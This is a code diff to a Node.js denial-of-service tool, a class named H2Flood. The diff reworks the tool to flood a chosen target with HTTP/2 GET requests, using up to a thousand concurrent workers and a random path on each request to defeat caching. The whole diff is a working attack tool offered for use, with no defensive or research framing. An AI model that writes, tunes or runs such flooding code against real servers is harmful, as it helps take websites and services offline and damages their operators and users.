@@ -1,7 +1,8 @@
-const http2 = require('http2-wrapper');
+const http2 = require('http2');
 const os = require('os');
+const fs = require('fs');
 
-const MAX_CONCURRENT = Math.min(os.cpus().length * 150, 1500);
+const MAX_CONCURRENT = Math.min(os.cpus().length * 100, 1000); // Adjust for CPU cores
 const REQUEST_TIMEOUT = 4000;
 
 class H2Flood {
@@ -13,18 +14,31 @@ class H2Flood {
     }
 
     async floodRequest() {
-        const url = this.target + (this.target.includes('?') ? '&' : '?') + Math.random().toString(36).substring(2, 10);
-        try {
-            await http2.auto.resolveRequest(url, {
-                method: 'GET',
-                timeout: REQUEST_TIMEOUT
+        const client = http2.connect(this.target);
+        const req = client.request({
+            ':method': 'GET',
+            ':path': '/' + Math.random().toString(36).substring(2, 10) // Random query for each request
+        });
+
+        req.setTimeout(REQUEST_TIMEOUT);
+        
+        return new Promise((resolve, reject) => {
+            req.on('response', (headers, flags) => {
+                req.resume();
+                resolve();
             });
-        } catch {}
+            
+            req.on('error', (err) => {
+                reject(err);
+            });
+            
+            req.end();
+        });
     }
 
     async worker() {
         while (this.running && Date.now() - this.startTime < this.duration) {
-            this.floodRequest();
+            await this.floodRequest();
         }
     }
 
